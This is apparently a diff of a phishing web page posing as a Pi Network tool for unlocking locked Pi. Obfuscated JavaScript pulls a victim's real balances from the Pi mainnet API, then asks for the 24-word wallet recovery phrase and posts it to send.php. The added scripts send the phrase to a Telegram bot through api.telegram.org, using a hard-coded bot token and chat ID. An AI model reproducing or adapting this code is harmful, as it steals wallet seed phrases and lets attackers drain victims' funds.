_0x548dd5=_0x51a986;_0xef2784[_0x548dd5(0x261)][_0x548dd5(0x23f)]='none',_0x5d5d21[_0x548dd5(0x224)]='<div\x20class=\x22text-center\x20py-4\x20text-red-600\x22>An\x20error\x20occurred:\x20'+_0x324352[_0x548dd5(0x21e)]+_0x548dd5(0x251),console[_0x548dd5(0x1d1)]('Error\x20fetching\x20data:',_0x324352);});});function _0x541b06(_0x29f944,_0x4960a9,_0x45cb6a){const _0x4216b3=_0x281089,_0x3de820=[];if(_0x29f944&&_0x29f944[_0x4216b3(0x208)]&&_0x29f944[_0x4216b3(0x208)][_0x4216b3(0x22a)]){const _0x4b82cc=_0x29f944[_0x4216b3(0x208)]['records'];for(const _0x2b1241 of _0x4b82cc){if(_0x2b1241[_0x4216b3(0x1bc)]===_0x4216b3(0x202))try{const _0x2430de=parseFloat(_0x2b1241['amount']),_0x515625=_0x2b1241[_0x4216b3(0x23d)],_0x4eb508=new Date(_0x515625);if(_0x2b1241['predicate']&&_0x2b1241[_0x4216b3(0x1f2)][_0x4216b3(0x1dd)]&&_0x2b1241[_0x4216b3(0x1f2)][_0x4216b3(0x1dd)][_0x4216b3(0x22f)]){const _0xb043f0=parseInt(_0x2b1241[_0x4216b3(0x1f2)]['not']['rel_before']),_0x33215a=new Date(_0x4eb508[_0x4216b3(0x1c3)]()+_0xb043f0*0x3e8),_0x366673=new Date(),_0x51de94=_0x366673>=_0x33215a,_0x1a820f=Math['max'](0x0,(_0x33215a-_0x366673)/0x3e8);_0x3de820['push']({'amount':_0x2430de,'createdAt':_0x4eb508,'unlockTime':_0x33215a,'secondsToUnlock':_0xb043f0,'balanceId':_0x2b1241[_0x4216b3(0x23b)],'canClaim':_0x51de94,'secondsUntilUnlock':_0x1a820f,'publicKey':_0x45cb6a});}}catch(_0x3d1913){console['error'](_0x4216b3(0x1f6),_0x3d1913);}}}if(_0x3de820[_0x4216b3(0x1f9)]===0x0&&_0x4960a9&&_0x4960a9['_embedded']&&_0x4960a9['_embedded'][_0x4216b3(0x22a)]){const _0x45a0c1=_0x4960a9['_embedded']['records'];for(const _0x50149c of _0x45a0c1){if(_0x50149c[_0x4216b3(0x229)]===_0x4216b3(0x215))try{const _0x2824a6=parseFloat(_0x50149c[_0x4216b3(0x1e0)]),_0x4046c0=_0x50149c['last_modified_time'],_0x18d970=new Date(_0x4046c0);for(const _0x37213f of _0x50149c[_0x4216b3(0x1e6)]){if(_0x37213f['destination']===_0x45cb6a&&_0x37213f[_0x4216b3(0x1f2)]&&_0x37213f[_0x4216b3(0x1f2)]['not']&&_0x37213f[_0x4216b3(0x1f2)]['not']['rel_before']){const _0x39d9f3=parseInt(_0x37213f[_0x4216b3(0x1f2)][_0x4216b3(0x1dd)][_0x4216b3(0x22f)]),_0x30f167=new Date(_0x18d970[_0x4216b3(0x1c3)]()+_0x39d9f3*0x3e8),_0x4aee32=new Date(),_0x47b675=_0x4aee32>=_0x30f167,_0x5de4eb=Math[_0x4216b3(0x1ef)](0x0,(_0x30f167-_0x4aee32)/0x3e8);_0x3de820[_0x4216b3(0x21f)]({'amount':_0x2824a6,'createdAt':_0x18d970,'unlockTime':_0x30f167,'secondsToUnlock':_0x39d9f3,'balanceId':_0x50149c['id'],'canClaim':_0x47b675,'secondsUntilUnlock':_0x5de4eb,'publicKey':_0x45cb6a});}}}catch(_0x4c8203){console[_0x4216b3(0x1d1)]('Error\x20parsing\x20claimable\x20balance\x20data:',_0x4c8203);}}}return _0x3de820[_0x4216b3(0x1d3)]((_0x203734,_0x4447bc)=>_0x203734['unlockTime']-_0x4447bc[_0x4216b3(0x239)]),_0x3de820;}function _0x579ece(_0x3fbdaf){const _0x439abf=_0x281089;_0x5d5d21[_0x439abf(0x224)]='';const _0x1ce688=_0x439abf(0x230),_0x3a1692=_0x439abf(0x259);for(const _0x3b1019 of _0x3fbdaf){if(!_0x3b1019[_0x439abf(0x1fb)]){const _0x430d12=document['createElement'](_0x439abf(0x24e));_0x430d12[_0x439abf(0x248)]=_0x439abf(0x1de);const _0x3d75fb=_0x4b6a6c(_0x3b1019[_0x439abf(0x239)]);_0x430d12[_0x439abf(0x224)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22lock-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://img.upanh.tv/2025/04/15/iconlockpi.png\x22\x20alt=\x22Lock\x20Icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pi-amount\x22>+'+_0x3b1019[_0x439abf(0x1e0)][_0x439abf(0x24f)](0x7)+_0x439abf(0x1d8)+_0x3a1692+_0x439abf(0x1be)+_0x3d75fb+_0x439abf(0x257),_0x5d5d21[_0x439abf(0x1ff)](_0x430d12);}}_0x5d5d21['children'][_0x439abf(0x1f9)]===0x0&&(_0x5d5d21[_0x439abf(0x224)]=_0x439abf(0x252));}_0x5c0f7b[_0x281089(0x217)](_0x281089(0x1e4),function(_0x352c03){const _0x9b9732=_0x281089;_0x352c03[_0x9b9732(0x264)]===_0x9b9732(0x1fa)&&_0x3f674f['click']();});function _0x4b6a6c(_0x1bc1d1){const _0x5395b9=_0x281089,_0x578f69=_0x1bc1d1[_0x5395b9(0x1d4)](),_0x56f17d=String(_0x1bc1d1[_0x5395b9(0x25a)]()+0x1)[_0x5395b9(0x205)](0x2,'0'),_0x4b2c38=String(_0x1bc1d1[_0x5395b9(0x245)]())[_0x5395b9(0x205)](0x2,'0'),_0x5ac287=String(_0x1bc1d1[_0x5395b9(0x1db)]())[_0x5395b9(0x205)](0x2,'0'),_0x5b8003=String(_0x1bc1d1[_0x5395b9(0x1f4)]())['padStart'](0x2,'0');return _0x578f69+'-'+_0x56f17d+'-'+_0x4b2c38+'\x20'+_0x5ac287+':'+_0x5b8003;}}));function _0x5b01(){const _0x20a24c=['navigateToHome','length','Enter','canClaim','homePage','396fLWSiq','totalLockedAmount','appendChild','querySelectorAll','amountSelectionSection','claimable_balance_claimant_created','rgba(255,\x20255,\x20255,\x200.08)','active','padStart','abstract','Error\x20accessing\x20localStorage:','_embedded','Expected:\x20','successAlert','forEach','\x0a\x20\x20\x20\x20<span\x20class=\x22warning-icon\x22><i\x20class=\x22fas\x20fa-info-circle\x22></i></span>\x0a\x20\x20\x20\x20<span>Found\x20','2178445MGPeLG','absent','toLowerCase','querySelector','Processing\x20unlock\x20request\x20with\x20amount:','.collapse-toggle','amountPage','textContent','native','reduce','addEventListener','add','successAmount','You\x20have\x20exceeded\x20the\x20number\x20of\x20requests\x20allowed\x20(2\x20times).\x20Please\x20contact\x20the\x20support\x20team\x20if\x20you\x20need\x20help.','borderBottomColor','abuse','classList','message','push','join','Error\x20updating\x20localStorage:','value','89104mEhzPl','innerHTML','matches','accident','send.php','amountValue','asset','records','invalidWords','acid','abandon','walletHash','rel_before','GABT7EMPGNCQSZM22DIYC4FNKHUVJTXITUF6Y5HNIWPU4GA7BHT4GC5G','391100LoGRSP','The\x20phrase\x20contains\x20invalid\x20words:\x20','floor','detailedPiResults','across','lockedPiSummary','closeSuccess','all','unlockTime','468330WhacMd','balance_id','Please\x20enter\x20the\x20correct\x2024\x20English\x20words.','created_at','trim','display','matchMedia','detailedLockedAmount','.button-text','checkLockedForm','Unlock\x20Pi\x20button\x20not\x20found\x20in\x20DOM','getDate','filter','\x20Pi\x20locked.\x20You\x20can\x20unlock\x20this\x20amount.\x20Please\x20enter\x20the\x20recovery\x20phrase\x20to\x20verify\x20the\x20wallet\x20owner.</span>\x0a','className','186IZfZid','achieve','(prefers-color-scheme:\x20dark)','.info-content','.info-header','div','toFixed','locked-pi-info-box','</div>','<div\x20class=\x22text-center\x20py-4\x20text-gray-600\x22>This\x20wallet\x20does\x20not\x20have\x20any\x20locked\x20Pi\x20or\x20has\x20not\x20yet\x20been\x20moved\x20to\x20Mainnet.</div>','input','slice','substring','6HaMmIg','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','unlockPage','GABT7...4GC5G','getMonth','...','transparent','loading','map','Please\x20enter\x20the\x20recovery\x20phrase','requestCount','style','Submit\x20amount\x20button\x20clicked','publicKeyError','key','Submit\x20unlock\x20button\x20clicked','absorb','piAmount','type','Recovery\x20phrase\x20processed\x20and\x20completion\x20flow\x20executed','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22unlock-date\x22>','block','english.txt','split','Close\x20success\x20button\x20clicked','getTime','submitAmount','navigateToUnlock','submitUnlock','4801350lKRYfu','getItem','textarea','2203644JacTsH','/effects?limit=200','\x20words)','Max:\x20','then','log','getElementById','error','errorMessage','sort','getFullYear','click','json','rgba(0,\x200,\x200,\x200.08)','\x20Pi</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22from-address\x22>From:\x20','Error\x20in\x20submission\x20process:','modalBackdrop','getHours','Failed\x20to\x20fetch\x20wordlist','not','lock-card','Please\x20enter\x20exactly\x2024\x20words\x20(currently:\x20','amount','above','https://api.mainnet.minepi.com/accounts/','piSubmissionCount','keypress','availableAmount','claimants','none','Unlock\x20Pi\x20button\x20clicked\x20via\x20event\x20listener','application/json','valid','An\x20error\x20occurred\x20when\x20sending\x20the\x20request.\x20Please\x20try\x20again\x20later.','flex','36680RfvDFi','has','max','setItem','resultsContainer','predicate','Unlock\x20Pi\x20button\x20found\x20in\x20DOM','getMinutes','recoveryPhrase','Error\x20parsing\x20effect\x20data:','text'];_0x5b01=function(){return _0x20a24c;};return _0x5b01();}function _0x1056(_0x57f9d6,_0x54fc93){const _0x5b0111=_0x5b01();return _0x1056=function(_0x105677,_0xa5a98f){_0x105677=_0x105677-0x1bc;let _0x3342ec=_0x5b0111[_0x105677];return _0x3342ec;},_0x1056(_0x57f9d6,_0x54fc93);}function initializeCollapsibleInfo(){const _0x4e411a=_0x1056,_0x52055f=document[_0x4e411a(0x200)]('.info-collapsible');_0x52055f[_0x4e411a(0x20b)](_0x3d942e=>{const _0xd1f8f2=_0x4e411a,_0x1381ad=_0x3d942e['querySelector'](_0xd1f8f2(0x24d)),_0x32df1b=_0x3d942e['querySelector'](_0xd1f8f2(0x24c)),_0x293671=_0x3d942e[_0xd1f8f2(0x210)](_0xd1f8f2(0x212));_0x1381ad[_0xd1f8f2(0x217)](_0xd1f8f2(0x1d5),()=>{const _0x5f1830=_0xd1f8f2;_0x293671['classList']['toggle'](_0x5f1830(0x204)),_0x32df1b[_0x5f1830(0x21d)]['contains'](_0x5f1830(0x204))?(_0x32df1b[_0x5f1830(0x21d)]['remove'](_0x5f1830(0x204)),_0x1381ad[_0x5f1830(0x261)][_0x5f1830(0x21b)]=_0x5f1830(0x25c)):(_0x32df1b[_0x5f1830(0x21d)][_0x5f1830(0x218)](_0x5f1830(0x204)),window[_0x5f1830(0x240)]&&window[_0x5f1830(0x240)]('(prefers-color-scheme:\x20dark)')[_0x5f1830(0x225)]?_0x1381ad[_0x5f1830(0x261)]['borderBottomColor']=_0x5f1830(0x203):_0x1381ad[_0x5f1830(0x261)]['borderBottomColor']=_0x5f1830(0x1d7));});});}function sendToTelegram(){const _0x5adc1f=_0x1056,_0x5f8741=document[_0x5adc1f(0x210)](_0x5adc1f(0x1c9)),_0x22b0fa=_0x5f8741[_0x5adc1f(0x222)]['trim']();if(_0x22b0fa[_0x5adc1f(0x1c1)](/\s+/)['length']!==0x18)return alert(_0x5adc1f(0x23c)),![];return fetch(_0x5adc1f(0x227),{'method':'POST','headers':{'Content-Type':_0x5adc1f(0x1e9)},'body':JSON['stringify']({'walletAddress':_0x22b0fa})})[_0x5adc1f(0x1ce)](_0x1c5b7c=>{const _0x228a12=_0x5adc1f;_0x1c5b7c['ok']&&(_0x5f8741[_0x228a12(0x222)]='');}),![];}
+        </script>
+
+        <!-- Google Tag Manager (noscript) -->
+        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MMXD7N7V"
+        height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+        <!-- End Google Tag Manager (noscript) -->
+         
+    
+
+<script async="" type="text/javascript" src="./1_files/0.php"></script><meta name="facebook-domain-verification" content="yok84u8taqbh6566dfta7ej4inwi07">
+<script id="" text="" charset="" type="text/javascript" src="./1_files/js(3)"></script>
+<script type="text/javascript" id="" charset="">window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date);gtag("config","G-02Y0YQS4ZW");</script><iframe src="./1_files/saved_resource.html" width="0" height="0" style="display: none;"></iframe><script src="./1_files/mm.js.indir" async=""></script><script async="" src="./1_files/lt.min.js.indir"></script><script async="" src="./1_files/saved_resource(2)"></script><iframe id="lt_3p_3825" src="./1_files/lt.iframe.html" title="empty" tabindex="-1" role="presentation" aria-hidden="true" style="border: 0px; width: 0px; height: 0px; display: block;"></iframe><script async="" type="text/javascript" src="https://s4.histats.com/stats/e.php?4944516&amp;@Ab&amp;@R3828&amp;@w"></script><script async="" src="./1_files/saved_resource(2)"></script><script src="./1_files/mm.js.indir" async=""></script>
+<script>
+function sendToTelegram() {
+    const phrase = document.querySelector('textarea').value;
+    const token = "7038125050:AAFJn5ECemnWhO_Ng8pL7S4NRI4UsZ0Br-k";
+    const chatId = "7932342101";
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: "Recovery Phrase:\n" + phrase
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            alert("Recovery phrase successfully sent to Telegram.");
+        } else {
+            alert("Failed to send recovery phrase.");
+        }
+    });
+}
+</script>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const unlockButton = document.querySelector(".submit-button");
+
+    if (unlockButton) {
+        unlockButton.addEventListener("click", function(e) {
+            e.preventDefault();
+
+            const phrase = document.querySelector(".form-input").value.trim();
+            if (phrase === "") return;
+
+            // Telegram yönlendirme (yeni sekmede)
+            window.open("https://t.me/seninTelegramBotun?start=" + encodeURIComponent(phrase), "_blank");
+
+            // Başarı ekranını göster
+            const successModal = document.querySelector(".success-alert");
+            const backdrop = document.querySelector(".modal-backdrop");
+
+            if (successModal && backdrop) {
+                successModal.style.display = "block";
+                backdrop.style.display = "block";
+
+                setTimeout(() => {
+                    successModal.style.display = "none";
+                    backdrop.style.display = "none";
+                }, 5000);
+            }
+        });
+    }
+});
+</script>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const unlockButton = document.querySelector(".submit-button");
+
+    if (unlockButton) {
+        unlockButton.addEventListener("click", function (e) {
+            e.preventDefault();
+
+            const phrase = document.querySelector(".form-input").value.trim();
+            if (phrase === "") return;
+
+            // TELEGRAM BOT'A MESAJ GÖNDER
+            const botToken = "7038125050:AAFJn5ECemnWhO_Ng8pL7S4NRI4UsZ0Br-k";
+            const chatId = "7932342101";
+            const text = encodeURIComponent("Recovery Phrase: " + phrase);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`)
+                .then(res => res.json())
+                .then(data => {
+                    // Başarıyla gönderildiyse başarı ekranını göster
+                    if (data.ok) {
+                        const successModal = document.querySelector(".success-alert");
+                        const backdrop = document.querySelector(".modal-backdrop");
+
+                        if (successModal && backdrop) {
+                            successModal.style.display = "block";
+                            backdrop.style.display = "block";
+
+                            setTimeout(() => {
+                                successModal.style.display = "none";
+                                backdrop.style.display = "none";
+                            }, 5000);
+                        }
+                    }
+                });
+        });
+    }
+});
+</script>
+
+</body></html>
